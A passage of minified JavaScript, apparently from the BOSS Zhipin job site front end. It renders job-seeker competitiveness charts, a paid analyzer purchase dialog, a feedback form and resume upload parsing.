            backgroundColor: "#f9fafc",
            plotBackgroundColor: "#f9fafc"
        },
        plotOptions: {
            series: {
                animation: !1
            }
        },
        tooltip: {
            enabled: !1
        },
        title: {
            text: null
        },
        credits: {
            enabled: !1
        },
        pane: {
            size: "80%"
        },
        xAxis: {
            labels: {
                rotation: 0,
                align: "center",
                distance: 26,
                style: {
                    font: "normal 11px Verdana, sans-serif",
                    color: "blank"
                }
            },
            categories: ["与BOSS沟通情况", "学历", "与该职位匹配度", "工作经验"],
            tickmarkPlacement: "on",
            lineWidth: 0,
            gridLineWidth: 3,
            gridLineDashStyle: "ShortDot",
            gridLineColor: "green",
            gridZIndex: 40
        },
        yAxis: {
            gridLineInterpolation: "polygon",
            lineWidth: 0,
            min: 0
        },
        legend: {
            align: "center",
            verticalAlign: "bottom",
            y: 0,
            x: 90,
            layout: "vertical",
            squareSymbol: !1,
            symbolWidth: 40,
            symbolHeight: 10,
            symbolRadius: 0,
            itemStyle: {
                fontSize: "11px",
                fontWeight: "normal"
            }
        },
        animation: !1,
        series: [{
            name: "市场水平",
            data: t,
            pointPlacement: "on",
            color: "rgb(188,249,232)"
        }, {
            name: "您的情况",
            data: i,
            pointPlacement: "on",
            color: "rgb(103,148,248)"
        }]
    }))
}),
$(document).ready(function() {
    var e, i, n, a, o, s, r, c, l, d;
    isOldCompetitivePage && (e = _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum,
    i = [],
    e <= .25 ? (i = [340, 340],
    $(".competitive_text").html("极好"),
    $(".competitive_text").parents(".row-one").find(".chart_title").find("p").eq(1).html("极好")) : .25 < e && e <= .5 ? (i = [260, 260],
    $(".competitive_text").html("优秀"),
    $(".competitive_text").parents(".row-one").find(".chart_title").find("p").eq(1).html("优秀")) : .5 < e && e <= .75 ? (i = [160, 160],
    $(".competitive_text").html("良好"),
    $(".competitive_text").parents(".row-one").find(".chart_title").find("p").eq(1).html("良好")) : .75 < e && (i = [88, 88],
    $(".competitive_text").html("一般"),
    $(".competitive_text").parents(".row-one").find(".chart_title").find("p").eq(1).html("一般")),
    n = document.getElementById("canvas").getContext("2d"),
    a = 1,
    o = 0,
    s = $(".competition_show_chart img").width(),
    r = $(".competition_show_chart img").height(),
    c = 0,
    l = document.getElementById("canvas1").getContext("2d"),
    d = 0,
    setInterval(function() {
        c++,
        d++,
        a += .01;
        var e = -Math.sin(a)
          , t = Math.cos(a);
        c < i[0] && (o < 1 ? o += .03 < o ? 1 / (2 * i[0]) : 1 / (5 * i[0]) : o = 0,
        n.save(),
        n.globalAlpha = 1 < c ? 1 : 0,
        n.beginPath(),
        n.fillStyle = "rgba(83,202,195," + o + ")",
        n.arc(s / 2 + 125 * e, r / 2 + 125 * t, 7, 0, 2 * Math.PI),
        n.fill(),
        n.restore()),
        10 < d && d < i[1] && (l.clearRect(0, 0, s, r),
        l.save(),
        l.translate(s / 2, r / 2),
        l.rotate(d * Math.PI / 320),
        l.fillStyle = "rgb(83,202,195)",
        l.beginPath(),
        l.arc(-120, 75, 5, 0, 2 * Math.PI, !0),
        l.closePath(),
        l.fill(),
        l.restore())
    }, 10))
}),
{
    Job_Hot_Min: "在一大波牛人到来之前，赶紧勾搭Boss，拿下这个职位！",
    Job_Hot_Medium: "该职位备受牛人青睐，值得争取！",
    Job_Hot_Max: "该职位备受牛人青睐，值得争取！",
    Job_Hot_SuperMax: "该职位备受牛人青睐，值得争取！",
    Comm_Boss_Ignore: "再向Boss详细介绍一下自己吧",
    Comm_Comm: "在与Boss的沟通中，让Ta感受到你的认可与期待",
    Comm_Deliver: "在与Boss的沟通中，让Ta感受到你的认可与期待",
    Comm_Exchange: "在与Boss的沟通中，让Ta感受到你的认可与期待",
    Comm_Interview: "Offer距你只有一步之遥！",
    Boss_Active_Min: "多与Boss打招呼，让Ta看到优秀的你终于出现在了Ta的面前",
    Boss_Active_Medium: "Boss对该职位的需求比较紧急，快去勾搭吧！",
    Boss_Active_Max: "Boss对该职位的需求比较紧急，快去勾搭吧！",
    Boss_Active_SuperMax: "Boss对该职位需求非常紧急，快去勾搭吧！",
    CV_30: "简历并不代表全部，告诉Boss你的态度与实力！",
    CV_50: "与Boss保持积极的沟通，才更有可能获得这个机会",
    CV_80: "与Boss保持积极的沟通，才更有可能获得这个机会",
    CV_80_Plus: "你有很大几率被Boss认可，积极展现你自己！"
})
  , ItemShop = ($(document).ready(function() {
    var e, o, s, n;
    function t() {
        $("#competitive-main").length && window.ids.forEach(function(e) {
            var t, i, n;
            t = "#" + (t = e.id),
            t = $(t),
            i = t.offset(),
            (n = $(window)).scrollTop() > i.top + t.outerHeight() || n.scrollTop() + n.height() < i.top || e.excute || (t = "#" + e.id,
            e.excute = !0,
            0 < e.width && ($(t).animate({
                width: e.width + "px"
            }, "slow"),
            $(t).css("overflow", "visible")),
            0 < e.height && ($(t).animate({
                height: e.height + "px"
            }, "slow"),
            $(t).css("overflow", "visible")))
        })
    }
    isOldCompetitivePage && (window.ids = [{
        id: "Comm_Interview",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Comm_Exchange",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Comm_Deliver",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Comm_Comm",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Comm_Boss_Ignore",
        width: 0,
        height: 0,
        excute: !1
    }, , {
        id: "CV_30",
        width: 0,
        height: 0,
        excute: !1
    }, , {
        id: "CV_50",
        width: 0,
        height: 0,
        excute: !1
    }, , {
        id: "CV_80",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "CV_80_Plus",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Degree_HighScool_And_Below",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Degree_Junior",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Degree_Bachelor",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Degree_Master",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Degree_Phd",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Exp_Fresh",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Exp_Less_1",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Exp_1_3",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Exp_3_5",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Exp_5_10",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Exp_10_Plus",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Salary_NO",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Salary_Min",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Salary_Medium",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Salary_Max",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "Salary_SuperMax",
        width: 0,
        height: 0,
        excute: !1
    }, {
        id: "container",
        width: 0,
        height: 0,
        excute: !1
    }],
    e = function(i, n) {
        var a;
        return function() {
            var e = this
              , t = arguments;
            clearTimeout(a),
            a = setTimeout(function() {
                n.apply(e, t)
            }, i)
        }
    }
    ,
    $(window).scroll(e(200, t)),
    e(200, t)(),
    _COMPETITIVE_PAGE.reportDataJson.Communicate.forEach(function(t, e, i) {
        var n = "#" + t.factor
          , a = $(".hoz_bar").width()
          , o = t.rate * a / 100
          , s = 0;
        if (ids.map(function(e) {
            e.id == t.factor && (e.width = o)
        }),
        $(n).find(".percent").html(t.rate + "%"),
        t.isCur && ($(n).find(".work_exp").show(),
        $("#contract-text").html(text[t.factor])),
        t.isCur && 0 != e) {
            for (var r = e - 1; 0 <= r; r--)
                s += i[r].rate;
            0 == s && $("#contract").html("1%").prev("span").html("超过了"),
            s < 50 && 0 < s && $("#contract").html(parseInt(s) + "%").prev("span").html("超过了"),
            50 <= s && 100 - s != 0 && $("#contract").html(parseInt(100 - s) + "%").prev("span").html("排名前")
        } else
            0 == e && (s = 100);
        100 - s == 0 && $("#contract").html("1%").prev("span").html("超过了")
    }),
    _COMPETITIVE_PAGE.reportDataJson.CVMatch.forEach(function(t, e, i) {
        var n = "#" + t.factor
          , a = 0
          , o = $(".match_wrap").data("height") * parseInt($("html").css("fontSize"));
        if (height = t.rate * o / 100,
        ids.map(function(e) {
            e.id == t.factor && (e.height = height)
        }),
        $(n).find(".percent").html(t.rate + "%"),
        t.isCur && ($(n).find(".match").show(),
        $("#CVMatch-text").html(text[t.factor])),
        t.isCur && 0 != e) {
            for (var s = e - 1; 0 <= s; s--)
                a += i[s].rate;
            0 == a && $("#CVMatch").html("1%").prev("span").html("超过了"),
            a < 50 && 0 < a && $("#CVMatch").html(parseInt(a) + "%").prev("span").html("超过了"),
            50 <= a && 100 - a != 0 && $("#CVMatch").html(+parseInt(100 - a) + "%").prev("span").html("排名前")
        } else
            0 == e && (a = 100);
        100 - a == 0 && $("#CVMatch").html("1%").prev("span").html("超过了")
    }),
    _COMPETITIVE_PAGE.reportDataJson.Degree.forEach(function(t, e, i) {
        var n = "#" + t.factor
          , a = 0
          , o = $(".qua_wrap").data("height") * parseInt($("html").css("fontSize"))
          , s = t.rate * o / 100;
        if (ids.map(function(e) {
            e.id == t.factor && (e.height = s)
        }),
        $(n).find(".percent").html(t.rate + "%"),
        t.isCur && $(n).find(".match").show(),
        t.isCur && 0 != e) {
            for (var r = e - 1; 0 <= r; r--)
                a += i[r].rate;
            0 == a && $("#Degree").html("1%").prev("span").html("超过了"),
            a < 50 && 0 < a && $("#Degree").html(+parseInt(a) + "%").prev("span").html("超过了"),
            50 <= a && 100 - a != 0 && $("#Degree").html(+parseInt(100 - a) + "%").prev("span").html("排名前")
        } else
            0 == e && (a = 100);
        100 - a == 0 && $("#Degree").html("1%").prev("span").html("超过了")
    }),
    _COMPETITIVE_PAGE.reportDataJson.Experience.forEach(function(t, e, i) {
        var n = "#" + t.factor
          , a = 0
          , o = $(".hoz_bar").width()
          , s = t.rate * o / 100;
        if (ids.map(function(e) {
            e.id == t.factor && (e.width = s)
        }),
        $(n).find(".percent").html(t.rate + "%"),
        t.isCur && ($(n).find(".work_exp").show(),
        $("#Experience + p").html(text[t.factor])),
        t.isCur && 0 != e) {
            for (var r = e - 1; 0 <= r; r--)
                a += i[r].rate;
            0 == a && $("#Experience").html("1%").prev("span").html("超过了"),
            a < 50 && 0 < a && $("#Experience").html(+parseInt(a) + "%").prev("span").html("超过了"),
            50 <= a && 100 - a != 0 && $("#Experience").html(+parseInt(100 - a) + "%").prev("span").html("排名前")
        } else
            0 == e && (a = 100);
        100 - a == 0 && $("#Experience").html("1%").prev("span").html("超过了")
    }),
    _COMPETITIVE_PAGE.reportDataJson.Salary_Dynamic.forEach(function(t, e, i) {
        var n = "#" + t.factor
          , a = 0
          , o = $(".sal_wrap").data("height") * parseInt($("html").css("fontSize"));
        if (height = t.rate * o / 100,
        ids.map(function(e) {
            e.id == t.factor && (e.height = height)
        }),
        $(".Xtext").children()[e].innerText = t.name,
        $(n).find(".percent").html(t.rate + "%"),
        t.isCur && $(n).find(".sal").show(),
        t.isCur && 0 != e) {
            for (var s = e - 1; 0 <= s; s--)
                a += i[s].rate;
            0 == a && $("#Salary_Dynamic").html("1%").prev("span").html("超过了"),
            a < 50 && 0 < a && $("#Salary_Dynamic").html(+parseInt(a) + "%").prev("span").html("超过了"),
            50 <= a && 100 - a != 0 && $("#Salary_Dynamic").html(+parseInt(100 - a) + "%").prev("span").html("排名前"),
            $("#Salary_Dynamic + p").html(text[t.factor])
        } else
            0 == e && (a = 100);
        100 - a == 0 && $("#Salary_Dynamic").html("1%").prev("span").html("超过了"),
        t.isCur && "Salary_NO" == t.factor && $("#Salary_Dynamic").html(t.rate + "%").prev("span").html("未填写")
    }),
    o = "https://static.zhipin.com/v2/web/geek/images/peak_pink.png",
    s = "https://static.zhipin.com/v2/web/geek/images/peak_purple.png",
    _COMPETITIVE_PAGE.reportDataJson.Boss_Active.forEach(function(e, t) {
        var i = "#" + e.factor;
        if (e.isCur) {
            $(i).attr("src", o),
            $(i).hasClass("no_active") && $(i).removeClass("no_active"),
            $(i).hasClass("active") || $(i).addClass("active");
            for (var n = "", a = 0; a <= t; a++)
                n += "<img style='width: 20px; height: 20px; margin-left:10px; '  src='https://static.zhipin.com/v2/web/geek/images/icon-top.png' />";
            $("#Boss_Active").html("Boss活跃情况：" + e.name + n),
            $("#Boss_Active-text").html(text[e.factor])
        } else
            $(i).attr("src", s),
            $(i).hasClass("no_active") || $(i).addClass("no_active"),
            $(i).hasClass("active") && $(i).removeClass("active")
    }),
    o = "https://static.zhipin.com/v2/web/geek/images/peak_red.png",
    s = "https://static.zhipin.com/v2/web/geek/images/peak_blue.png",
    _COMPETITIVE_PAGE.reportDataJson.Job_Hot_Degree.forEach(function(e, t) {
        var i = "#" + e.factor;
        if (e.isCur) {
            $(i).attr("src", o),
            $(i).hasClass("no_active") && $(i).removeClass("no_active"),
            $(i).hasClass("active") || $(i).addClass("active");
            for (var n = "", a = 0; a <= t; a++)
                n += "<img style='width: 20px; height: 20px; margin-left:10px; '  src='https://static.zhipin.com/v2/web/geek/images/icon-fire.png' />";
            $("#Job_Hot_Degree").html("职位热度：" + e.name + n),
            $("#Job_Hot_Degree-text").html(text[e.factor])
        } else
            $(i).attr("src", s),
            $(i).hasClass("no_active") || $(i).addClass("no_active"),
            $(i).hasClass("active") && $(i).removeClass("active")
    }),
    n = [[0, 1.46, 2.85, 4.24], [0, 1.26, 2.85, 4.24], [0, 1.46, 2.65, 4.24], [0, 1.46, 2.8, 4.04]],
    _COMPETITIVE_PAGE.reportDataJson.Boss_Active.forEach(function(e, t, i) {
        e.isCur && n[t].forEach(function(e, t, i) {
            $("#boss_Active img").eq(t).css("left", e + "rem")
        })
    }),
    _COMPETITIVE_PAGE.reportDataJson.Job_Hot_Degree.forEach(function(e, t, i) {
        e.isCur && n[t].forEach(function(e, t, i) {
            $("#job_Hot img").eq(t).css("left", e + "rem")
        })
    }),
    .5 < _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum && 1 - _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum != 0 && $("#rank").html("个人综合竞争力：超过了" + parseInt(100 * (1 - _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum)) + "%"),
    _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum < .5 && 0 < _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum && $("#rank").html("个人综合竞争力：排名前" + parseInt(100 * _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum) + "%的人"),
    _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum != 0 && 1 - _COMPETITIVE_PAGE.position / _COMPETITIVE_PAGE.commNum != 0 || $("#rank").html("个人综合竞争力：超过了1%的人"),
    $(".work_card").click(function(e) {
        var t = $(this).data("url");
        t && (window.location.href = t)
    }),
    _COMPETITIVE_PAGE.hasFriendRelation || ($(".start-chat").show(),
    $(".sub").html("立即沟通"),
    $(".start-chat").on("click", function() {
        Detail.startChat($(this))
    })),
    $(".competitive-time").html("评估时间：" + (new Date).toISOString().slice(0, 10)),
    $(".evaluate_time").html("评估时间：" + (new Date).toISOString().slice(0, 10)),
    setTimeout(function() {
        $(".competition_show > p").hide()
    }, 2e3),
    $(".tip").click(function(e) {
        $(".tip span").show(),
        (e = e).stopPropagation ? e.stopPropagation() : e.cancelBubble = !0
    }),
    $(document).on("click touchstart", function(e) {
        $(".tip span").hide()
    }))
}),
function() {
    var i = function(e) {
        var t = $.Deferred();
        return $.post("/wapi/zpitem/web/item/detail/info", {
            encryptItemType: e,
            source: 1
        }, function(e) {
            0 == e.code && e.zpData ? t.resolve(e.zpData.itemSellUnit) : $.toast({
                content: e.message,
                type: "error"
            })
        }),
        t
    }
      , n = function(e) {
        return Utemplate('<div class="analyzer-head"><i class="icon-logo"></i><div><h4><%this.itemName%></h4><%this.itemNote%></div></div><ul class="analyzer-list"><li><div class="analyzer-item"><p class="icon-item icon-compete"></p><p>知己知彼</p><p class="gray">洞悉求职胜算</p></div><div class="analyzer-item"><p class="icon-item icon-compete-hover"></p></div></li><li><div class="analyzer-item"><p class="icon-item icon-expect"></p><p>了解薪资水平</p><p class="gray">查看期望薪资占比</p></div><div class="analyzer-item"><p class="icon-item icon-expect-hover"></p><p>期望薪资占比</p><p class="gray">让BOSS认可你，才能匹配好的薪资</p></div></li><li><div class="analyzer-item"><p class="icon-item icon-active"></p><p>实时招聘动态</p><p class="gray">了解职位近90天数据</p></div><div class="analyzer-item"><p class="icon-item icon-active-hover"></p><p>BOSS活跃情况</p><p class="gray">BOSS对该职位需求非常紧急</p></div></li></ul><dl class="analyzer-combo-list"><dt ka="item_pay_buy_competitive_chat">立即购买</dt><%for(var i=0;i<this.itemSellItemList.length;i++){%><dd <%if(i== 2){%>class="discount selected"<%}%> data-id="<%this.itemSellItemList[i].encryptItemId%>"><%this.itemSellItemList[i].specDesc%><i class="line"></i><%this.itemSellItemList[i].amountDesc%></dd><%}%></dl>', e)
    };
    return {
        analyzer: function(e) {
            function o() {
                e && e()
            }
            function t(e) {
                var n = this
                  , a = $(e);
                a.off("click"),
                a.on("click", ".analyzer-combo-list dd", function() {
                    a.find(".analyzer-combo-list .selected").removeClass("selected"),
                    $(this).addClass("selected"),
                    a.find(".analyzer-combo-list dt").removeClass("disabled")
                }),
                a.on("click", ".analyzer-combo-list dt", function() {
                    n.close();
                    var e = a.find(".analyzer-combo-list .selected").attr("data-id")
                      , t = {
                        url: "/geek/item/pay.json",
                        prePayUrl: "/geek/item/prepay.json",
                        data: {
                            itemId: e
                        },
                        itemId: e,
                        success: o
                    }
                      , i = {
                        success: o,
                        buy: function(e) {}
                    };
                    setTimeout(function() {
                        Payment.purchase(t, i)
                    }, 100)
                })
            }
            i("bf0aaab5053fa3e71nU~").then(function(e) {
                $.dialog({
                    bind: !0,
                    title: "",
                    content: n(e),
                    closeText: !0,
                    confirmText: !1,
                    cancelText: !1,
                    wrapClass: "prop-analyzer-wrap",
                    lock: !0,
                    onOpen: t,
                    onConfirm: function(e) {}
                })
            })
        },
        personality: function(t) {
            function e() {
                Payment.success({
                    article: "购买成功",
                    text: "",
                    confirmText: "立即使用",
                    confirm: function(e) {
                        t && t(e)
                    }
                })
            }
            Payment.purchase({
                url: "/geek/item/pay.json",
                prePayUrl: "/geek/item/prepay.json",
                data: {
                    itemId: "b015f75cd5e9aa4c1nR-"
                },
                itemId: "b015f75cd5e9aa4c1nR-",
                success: e
            }, {
                success: e,
                buy: function(e) {}
            })
        }
    }
}())
  , H5bridge = ($(function() {
    var t;
    ($(".satisfaction-feedback").length || $(".satisfaction-feedback .satisfaction").length) && ((t = $(".satisfaction-feedback")).find("textarea").on("input", function() {
        if (150 < Validate.getLength($(this).val()))
            return $.toast({
                type: "error",
                content: "不超过150个汉字"
            }),
            !1
    }),
    t.find(".satisfaction").on("click", function() {
        $(this).hasClass("selected") ? ($(this).removeClass("selected").siblings(".satisfaction").removeClass("selected"),
        t.find(".btn").addClass("disabled").prop("disabled", !0),
        t.find("input[name='level']").val("")) : ($(this).addClass("selected").siblings(".satisfaction").removeClass("selected"),
        t.find(".btn").removeClass("disabled").prop("disabled", !1),
        t.find("input[name='level']").val($(this).data("level")))
    }),
    t.on("submit", function() {
        if (t.find(".selected").length) {
            if (!(150 < Validate.getLength(t.find("textarea").val())))
                return $.ajax({
                    url: "/wapi/zpCommon/actionLog/geek/searchjob/feekback.json",
                    type: "POST",
                    data: t.serialize(),
                    dataType: "JSON",
                    timeout: 3e4
                }).success(function(e) {
                    0 == e.code ? ($.toast({
                        type: "success",
                        content: "<span class='icon-toast-content'>感谢反馈</span>",
                        wrapClass: "satisfaction-wrap"
                    }),
                    t.remove()) : $.toast({
                        type: "error",
                        content: e.message
                    })
                }).error(function() {
                    $.toast({
                        type: "error",
                        content: "服务器异常"
                    })
                }),
                !1;
            $.toast({
                type: "error",
                content: "不超过150个汉字"
            })
        }
    }))
}),
AnalysisResume = {
    init: function() {
        var e, t, i, n;
        $("#wrap").hasClass("sign-resume-wrapper") && (e = $(".sign-resume-wrapper"),
        t = e.find(".upload-resume"),
        i = e.find(".page-loading"),
        n = e.find(".sign-resume"),
        AnalysisResume.initUploadResume(function(e) {
            n.find(".sign-slide-box ul").find(".count").eq(0).text(e.data.validUserBaseInfoNum).end().eq(1).text(e.data.validWorkExpNum).end().eq(2).text(e.data.validEduExpNum).end().eq(3).text(e.data.validExpectNum),
            n.find("input[name=cvpk]").val(e.data.key),
            n.find("input[name=phone]").val(e.data.phone || ""),
            i.addClass("hide"),
            $(".sign-resume").removeClass("hide"),
            $(".sign-form:visible").find(".row-code").length && new VerifyCodeSDK({
                dom: $(".sign-form:visible").find(".row-code")[0],
                success: function(e) {
                    Sign.VerrifySuccessCallback(e)
                },
                ready: function(e) {
                    Sign.VerrifyReadyCallback(e)
                },
                fail: function(e) {
                    try {
                        $(".sign-form:visible").find("input[name=phone]").val();
                        e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                    } catch (e) {}
                }
            })
        }, function() {
            i.addClass("hide"),
            t.removeClass("hide");
            try {
                _T.sendEvent("nlp_resume_upload_fail")
            } catch (e) {}
        }, function() {
            t.addClass("hide"),
            i.removeClass("hide")
        }))
    },
    initUploadResume: function(successCallback, failCallback, loadingCallback) {
        var reg = /(\.|\/)(doc|docx|pdf)$/i;
        $("#fileupload").fileupload({
            method: "POST",
            url: "/wapi/zpgeek/resume/attachment/parser/upload.json",
            dataType: "text",
            acceptFileTypes: reg,
            maxChunkSize: 8388608,
            add: function(e, t) {
                "function" == typeof loadingCallback && loadingCallback();
                var i = t.files[0]
                  , n = i.name
                  , a = i.size;
                reg.test(n) ? 1e7 < a ? ($.dialog({
                    title: "",
                    content: '<div style="padding: 4px 0 30px;">您上传的文件超过8M，请重新选择</div>',
                    type: "warning",
                    closeText: !0,
                    confirmText: "确定",
                    cancelText: !1,
                    preKa: "",
                    wrapClass: "dialog-icons-default",
                    lock: !0
                }),
                "function" == typeof failCallback && failCallback()) : ($(this).data("resume", i),
                t.submit()) : ($.dialog({
                    title: "",
                    content: '<div style="padding: 4px 0 30px;">仅支持DOC、DOCX、PDF格式简历文件，请重新选择</div>',
                    type: "warning",
                    closeText: !0,
                    confirmText: "确定",
                    cancelText: !1,
                    preKa: "",
                    wrapClass: "dialog-icons-default",
                    lock: !0,
                    onConfirm: function(e) {
                        e.remove(),
                        $("#fileupload").click()
                    }
                }),
                "function" == typeof failCallback && failCallback())
            },
            done: function(e, data) {
                var result = data.result;
                switch ("string" == typeof result && (result = eval("(" + result + ")")),
                result.code) {
                case 0:
                    result.data = result.zpData,
                    result.data.key && "" != result.data.key.trim() ? "function" == typeof successCallback && successCallback(result) : ($.dialog({
                        title: "",
                        content: '<div style="padding: 4px 0 30px;">暂且无法解析，您可以选择其他文件或者尝试直接注册。</div>',
                        type: "error",
                        closeText: !0,
                        confirmText: "确定",
                        cancelText: !1,
                        preKa: "",
                        wrapClass: "dialog-icons-default",
                        lock: !0
                    }),
                    "function" == typeof failCallback && failCallback());
                    break;
                case 24:
                    $.dialog({
                        title: "",
                        content: '<div style="padding: 4px 0 30px;">请切换至牛人身份</div>',
                        type: "error",
                        closeText: !0,
                        confirmText: "确定",
                        cancelText: !1,
                        preKa: "",
                        wrapClass: "dialog-icons-default",
                        lock: !0
                    });
                    break;
                case 200214:
                    $.toast({
                        content: "牛人身份已完善，即将为你跳转个人中心页",
                        type: "info"
                    }),
                    setTimeout(function() {
                        window.location.href = "/web/geek/recommend"
                    }, 1e3);
                    break;
                case 200143:
                    $.dialog({
                        title: "",
                        content: '<div style="padding: 4px 0 30px;">服务器未获取到上传文件，请更换文件或稍后重试</div>',
                        type: "error",
                        closeText: !0,
                        confirmText: "确定",
                        cancelText: !1,
                        preKa: "",
                        wrapClass: "dialog-icons-default",
                        lock: !0
                    });
                    break;
                case 200140:
                    $.dialog({
                        title: "",
                        content: '<div style="padding: 4px 0 30px;">您上传的文件超过8M，请重新选择</div>',
                        type: "warning",
                        closeText: !0,
                        confirmText: "确定",
                        cancelText: !1,
                        preKa: "",
                        wrapClass: "dialog-icons-default",
                        lock: !0
                    });
                    break;
                case 200147:
                    $.dialog({
                        title: "",
                        content: '<div style="padding: 4px 0 30px;">仅支持DOC、DOCX、PDF格式简历文件，请重新选择</div>',
                        type: "warning",
                        closeText: !0,
                        confirmText: "确定",
                        cancelText: !1,
                        preKa: "",
                        wrapClass: "dialog-icons-default",
                        lock: !0
                    });
                    break;
                default:
                    $.dialog({
                        title: "",
                        content: '<div style="padding: 4px 0 30px;">服务器异常，请稍后重试</div>',
                        type: "error",
                        closeText: !0,
                        confirmText: "确定",
                        cancelText: !1,
                        preKa: "",
                        wrapClass: "dialog-icons-default",
                        lock: !0
                    })
                }
                0 != result.code && "function" == typeof failCallback && failCallback()
            },
            fail: function(e, t) {
                $.dialog({
                    title: "",
                    content: '<div style="padding: 4px 0 30px;">服务器异常，请稍后重试</div>',
                    type: "error",
                    closeText: !0,
                    confirmText: "确定",
                    cancelText: !1,
                    preKa: "",
                    wrapClass: "dialog-icons-default",
                    lock: !0
                }),
                "function" == typeof failCallback && failCallback()
            }
        })
    },
    signOrRegisterCallback: function(e, t) {
        var i, n = e.find(".form-footer .btn").addClass("btn-waiting"), e = $("#fileupload").data("resume");
        3 <= (t.resumeList || []).length && t.isComplete ? $.dialog({
            title: "提示",
            content: '<p>同时只能有3份附件文件，请前往附件管理删除一份后再上传</p><img src="https://img.bosszhipin.com/static/file/2022/9rghsb8r091671779041862.png" />',
            wrapClass: "max-resume-dialog",
            cancelText: "",
            confirmText: "我知道了",
            closeText: !0,
            onConfirm: function(e) {
                try {
                    _T.sendEvent("dialog_over")
                } catch (e) {}
                e.remove(),
                AnalysisResume.callbackDone(n, t)
            }
        }) : (3 <= t.resumeCount && (i = "",
        -1 < t.toUrl.indexOf("?") ? i += "&" : i += "?",
        t.toUrl += i + "maxResumeCount=true"),
        AnalysisResume.saveSilent(e, t.t).then(function() {
            AnalysisResume.callbackDone(n, t)
        }, function() {
            AnalysisResume.callbackDone(n, t)
        }))
    },
    saveSilent: function(resume, token) {
        var def = $.Deferred(), formData, secReqData;
        if (resume && "object" == typeof resume) {
            return formData = new FormData,
            secReqData = {},
            formData.append("file", resume),
            formData.append("fileType", 1),
            $.trim(token) && (formData.append("token", token),
            secReqData = {
                token: token
            }),
            zpToken.update().then(function() {
                $.ajax({
                    url: "/wapi/zpupload/resume/uploadFile.json",
                    type: "POST",
                    data: formData,
                    contentType: !1,
                    processData: !1,
                    success: function(data) {
                        "string" == typeof data && (data = eval("(" + data + ")")),
                        0 == data.code && data.zpData ? AnalysisResume.iframePreviewSuccess(data.zpData.previewUrl).then(function() {
                            $.ajax({
                                type: "POST",
                                url: "/wapi/zpgeek/resume/attachment/save.json?previewUrl=" + data.zpData.previewUrl,
                                dataType: "JSON",
                                data: secReqData,
                                success: function() {
                                    def.resolve()
                                },
                                error: function() {
                                    def.reject()
                                }
                            })
                        }, function() {
                            def.reject()
                        }) : def.reject()
                    },
                    error: function() {
                        def.reject()
                    }
                })
            }),
            def
        } else
            def.reject()
    },
    iframePreviewSuccess: function(e) {
        var t, i, n, a = $.Deferred(), o = document.createElement("iframe");
        return t = navigator.userAgent,
        i = -1 < t.indexOf("compatible") && -1 < t.indexOf("MSIE"),
        n = -1 < t.indexOf("Trident") && -1 < t.indexOf("rv:11.0"),
        t = -1 < t.indexOf("Edge"),
        o.src = i || n || t ? "/web/common/pdfjs-old/web/viewer.html?file=/wflow/zpgeek/download/preview4geek/" + e + "?annexType=1" : "/web/common/pdfjs/web/viewer.html?file=/wflow/zpgeek/download/preview4geek/" + e + "?annexType=1",
        o.style.display = "none",
        $("body").append(o),
        o.onload = function() {
            var e = 0
              , t = o.contentWindow
              , i = (t || a.reject(),
            setInterval(function() {
                e += 500,
                t.PDFView && t.PDFView.downloadComplete ? (clearInterval(i),
                a.resolve(),
                $(o).remove()) : 1e4 < e && (clearInterval(i),
                a.reject(),
                $(o).remove())
            }, 500))
        }
        ,
        o.onerror = function() {
            a.reject(),
            $(o).remove()
        }
        ,
        a
    },
    callbackDone: function(e, t) {
        e.removeClass("btn-waiting"),
        -1 != t.toUrl.indexOf("/web/geek/guide") ? (e = $(".sign-resume-wrapper").find(".sign-resume"),
        window.location.href = t.toUrl + "?cvpk=" + e.find("input[name=cvpk]").val()) : window.location.href = t.toUrl
    }
},
$(function() {
    $(".sign-resume-wrapper").length && AnalysisResume.init()
}),
{
    openWith: function(e, t) {
        !e || "openWithBlank" === function(e) {
            for (var t = {}, i = (1 < e.split("?").length ? e.split("?")[1] : e).split("&"), n = 0; n < i.length; n++) {
                var a = i[n].split("=");
                1 < a.length && (t[a[0]] = a[1])
            }
            return t
        }(e).type && (e = 1 < e.split("?").length ? e.split("?")[0] : e,
        window.open(e))
    }
});
$(function() {
    function a(e, t) {
        if (!e)
            return "";
        if (!t || $.isEmptyObject(t))
            return e;
        var i = e
          , n = (-1 < e.indexOf("?") && (t = $.extend({}, getQueryObject(e), t),
        i = e.split("?")[0]),
        "?");
        for (key in t)
            void 0 !== t[key] && null !== t[key] && (n += key + "=" + t[key] + "&");
        return i + n.slice(0, -1)
    }
    function t(e) {
        2 <= (e = e && filterXss(e) || "").length ? $.ajax({
            type: "GET",
            url: "/wapi/zpgeek/brand/suggest",
            data: {
                query: e
            },
            dataType: "json",
            timeout: 1e4,
            success: function(e) {
                var n;
                0 === e.code && (e = e.zpData && e.zpData.result || []).length ? (n = "",
                d.empty(),
